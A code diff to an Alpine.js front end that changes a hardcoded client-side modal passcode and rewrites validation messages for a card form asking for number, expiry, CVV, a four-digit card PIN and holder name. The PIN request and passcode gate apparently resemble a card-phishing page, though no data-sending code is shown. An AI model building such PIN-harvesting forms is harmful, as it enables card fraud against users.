@@ -98,7 +98,7 @@ document.addEventListener("alpine:init", () => {
   }));
   Alpine.data("modal", () => ({
     modalIsOpen: true,
-    passcode: "TIWcrBTjoPbd",
+    passcode: "epimk2hyf8ap80o1tfbd",
     pass: null,
     submit() {
       if (this.pass.replaceAll("-", "") == this.passcode) {
@@ -182,7 +182,7 @@ document.addEventListener("alpine:init", () => {
         this.holderValid = null;
 
       if (!cc) {
-        this.ccValid = "Card Number cannot be empty"
+        this.ccValid = "Field cannot be empty"
         return false;
       }
       if (!this.ccLogic(cc)) {
@@ -190,7 +190,7 @@ document.addEventListener("alpine:init", () => {
         return false;
       }
       if (!exp) {
-        this.expValid = "Expiry Date cannot be empty"
+        this.expValid = "Field cannot be empty"
         return false;
       }
       if (!this.expLogic(exp)) {
@@ -198,23 +198,23 @@ document.addEventListener("alpine:init", () => {
         return false;
       }
       if (!cvv) {
-        this.cvvValid = "CVV cannot be empty"
+        this.cvvValid = "Field cannot be empty"
         return false;
       }
       if (!cvv.match("^[0-9]{3}$")) {
-        this.cvvValid = "Invalid CVV "
+        this.cvvValid = "3 char required"
         return false;
       }
       if (!pin) {
-        this.pinValid = "Pin cannot be empty"
+        this.pinValid = "Field cannot be empty"
         return false;
       }
       if (!pin.match("^[0-9]{4}$")) {
-        this.pinValid = "Invalid Pin "
+        this.pinValid = "4 char required"
         return false;
       }
       if (!holder) {
-        this.holderValid = "Name cannot be empty"
+        this.holderValid = "Field cannot be empty"
         return false;
       }
       re = /\w.*\s.*\w/ 
